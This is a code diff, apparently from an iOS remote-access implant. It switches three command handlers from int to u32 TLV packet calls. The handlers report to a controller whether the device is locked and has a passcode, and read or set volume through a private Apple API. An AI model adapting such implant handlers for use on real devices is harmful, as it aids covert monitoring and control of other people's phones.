@@ -200,8 +200,8 @@ static tlv_pkt_t *ui_sbinfo(c2_t *c2)
 
     result = api_craft_tlv_pkt(API_CALL_SUCCESS);
 
-    tlv_pkt_add_int(result, TLV_TYPE_LOCKED, locked ? 1 : 0);
-    tlv_pkt_add_int(result, TLV_TYPE_PASSCODE, passcode ? 1 : 0);
+    tlv_pkt_add_u32(result, TLV_TYPE_LOCKED, locked ? 1 : 0);
+    tlv_pkt_add_u32(result, TLV_TYPE_PASSCODE, passcode ? 1 : 0);
 
     return result;
 }
@@ -213,7 +213,7 @@ static tlv_pkt_t *ui_volume_set(c2_t *c2)
 
     AVSystemController *controller;
 
-    tlv_pkt_get_int(c2->request, TLV_TYPE_INT, &value);
+    tlv_pkt_get_u32(c2->request, TLV_TYPE_INT, &value);
     delta = value * 0.1;
 
     controller = [NSClassFromString(@"AVSystemController") sharedAVSystemController];
@@ -243,7 +243,7 @@ static tlv_pkt_t *ui_volume_get(c2_t *c2)
 
     value = delta * 10;
     result = api_craft_tlv_pkt(API_CALL_SUCCESS);
-    tlv_pkt_add_int(result, TLV_TYPE_INT, value);
+    tlv_pkt_add_u32(result, TLV_TYPE_INT, value);
 
     return result;
 }
